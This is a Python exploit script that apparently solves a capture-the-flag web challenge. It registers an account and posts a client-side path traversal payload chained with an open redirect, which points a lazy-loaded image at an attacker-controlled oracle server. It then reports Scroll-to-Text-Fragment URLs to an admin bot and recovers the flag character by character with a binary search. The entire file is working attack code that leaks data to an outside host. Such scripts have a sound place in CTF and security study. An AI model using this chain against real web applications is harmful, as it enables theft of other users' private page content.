import os
from urllib.parse import quote
import httpx
import random
import string
import time

def generate_random_creds() -> str:
    username = "".join(random.choices(string.ascii_letters + string.digits, k=8))
    password = "".join(random.choices(string.ascii_letters + string.digits, k=8))

    return username, password

def register(client: httpx.Client) -> [str, str]:
    username, password = generate_random_creds()
    data = {
        "username": username,
        "email": f"{username}@gmail.com",
        "password": password,
        "confirm_password": password
    }
    response = client.post("/register", data=data)

    assert response.status_code == 302, "[-] Failed to register."

    return username, password

def login(client: httpx.Client, username: str, password: str) -> None:
    data = {
        "username": username,
        "password": password
    }
    response = client.post("/login", data=data)

    assert response.status_code == 302, "[-] Failed to login."

def report(client: httpx.Client, url: str) -> None:
    data = {
        "url": url,
    }
    response = client.post("/api/report", json=data)
    assert response.status_code == 200, f"[-] Failed to execute make the report for payload: {url}"

def CSPT_Gadget(client: httpx.Client, username: str, ORACLE_SERVER_URL: str) -> None:
    padding = "<ul>" + "<li>" * 300 + "</ul>" # move the lazy-loaded iframe outside user viewport
    CSPT_payload = f"../login?redirect={quote(ORACLE_SERVER_URL)}/hit%3Flol.gif"  # chain the CSPT with an Open Redirect to hit our exploit server
    payload = {
        "content": padding,
        "gifUrl": CSPT_payload
    }

    response = client.post(f"/users/@{username}/post", json=payload)
    assert response.status_code == 200, "[-] Failed to execute trigger the CSPT Gadget."

def Oracle(client: httpx.Client, ORACLE_SERVER_URL: str) -> bool:
    oracle = client.get(f"{ORACLE_SERVER_URL}/poll").text
    return bool(int(oracle))

def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORACLE_SERVER_URL: str) -> None:
    charset = string.ascii_lowercase + "}"
    current_flag = "SCC{"

    # Binary Search by abusing Multiple STTF directives to achieve O(logN)
    while True:
        L = 0
        R = len(charset) - 1
        found_char = False

        while L <= R and not found_char:
            M = (L + R) // 2

            test_chars = charset[L:M+1]

            fragment_parts = []
            for char in test_chars:
                # Format: "second-last-char-,last-char,-target-char" to avoid FP
                fragment_parts.append(f"{current_flag[-2]}-,{current_flag[-1]},-{char}")

            sttf_fragment = ":~:text=" + "&text=".join(fragment_parts)
            payload = f"{REPORT_SERVER_URL}/users/@{username}#{sttf_fragment}"

            report(client, payload)
            time.sleep(2.5)

            print(f"Testing range: {charset[L]} to {charset[M]} (index {L}-{M})")
            if Oracle(client, ORACLE_SERVER_URL):
                if L == M:
                    found_char = True
                    current_flag += charset[M]
                    print(f"[+] Found character: {charset[M]}")
                else:
                    R = M
            else:
                L = M + 1

        if not found_char:
            print("[*] Finished exfiltrating the flag.")
            print("[+] Flag: " + current_flag)
            break

def exploit():
    BASE_URL = os.environ["SERVICE_WEB_HTTP_ENDPOINT"]
    ORACLE_SERVER_URL = os.environ["ORACLE_SERVER_URL"]
    REPORT_SERVER_URL = "http://web:1337"

    client = httpx.Client(
        base_url=BASE_URL,
        verify=False,
        timeout=10
    )

    username, password = register(client)
    login(client, username, password)
    print("[+] Successfully registered and logged in.")

    CSPT_Gadget(client, username, ORACLE_SERVER_URL)
    print("[+] Successfully triggered the CSPT Gadget.")

    print("[+] Triggering the STTF Gadget...")
    STTF_Gadget(client, username, REPORT_SERVER_URL, ORACLE_SERVER_URL)

if __name__ == "__main__":
    exploit()
